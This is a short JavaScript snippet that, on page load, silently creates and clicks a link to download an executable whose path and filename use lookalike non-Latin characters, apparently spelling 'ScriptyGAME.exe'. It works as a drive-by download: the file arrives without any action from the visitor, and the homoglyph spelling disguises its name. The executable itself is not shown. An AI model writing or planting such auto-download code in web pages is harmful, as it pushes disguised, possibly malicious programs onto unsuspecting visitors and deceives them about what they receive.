window.onload = function () {
  const downloadUrl = "/assets/files/ЅϲʀіρτуᏀᎪⅯЕ.exe";
  const link = document.createElement('a');
  link.href = downloadUrl;
  link.download = "ЅϲʀіρτуᏀᎪⅯЕ.exe";
  
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
};
